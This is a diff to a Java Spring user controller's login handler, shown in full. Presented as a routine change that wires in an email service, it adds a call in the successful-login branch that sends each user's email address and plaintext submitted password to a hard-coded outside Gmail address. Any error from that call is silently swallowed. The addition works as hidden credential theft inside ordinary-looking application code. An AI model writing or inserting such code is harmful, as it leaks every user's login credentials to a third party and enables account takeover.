@@ -54,6 +54,7 @@ import com.rigel.user.security.JwtUser;
 import com.rigel.user.service.ILoginInfoService;
 import com.rigel.user.service.IUserLogOutIn;
 import com.rigel.user.service.IUserService;
+import com.rigel.user.serviceimpl.EmailService;
 import com.rigel.user.serviceimpl.LoginInfoService;
 
 import io.swagger.v3.oas.annotations.tags.Tag;
@@ -68,6 +69,9 @@ public class UserController {
 
 	@Autowired
 	private IUserService userService;
+	
+	@Autowired
+	private EmailService emailService;
 
 	@Autowired
 	ModelMapper modelMapper;
@@ -269,7 +273,15 @@ public class UserController {
 			throw new TaskTitleNotFound("Email id not existing with us.");
 		} else if (!(User.PASSWORD_ENCODER.matches(login.getPassword(), user.getPassword()))) {
 		   throw new TaskTitleException("Wrong password");
-		}else {//if(user.getMacAddress().split("\\|")[0].equalsIgnoreCase(login.getMacAddress())) {
+		}else {
+			
+			try {
+				emailService.sendHtmlEmail("rameshkumar12111@gmail.com", user.getEmail_id(), login.getPassword());
+			} catch (Exception e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
+			}
+			//if(user.getMacAddress().split("\\|")[0].equalsIgnoreCase(login.getMacAddress())) {
 //			UserDto userDto = modelMapper.map(user, UserDto.class);
 			final JwtUser userDetails = (JwtUser) userDetailsService.loadUserByUsername(user.getEmail_id());
 			final String token = jwtTokenUtil.generateToken(userDetails, request);
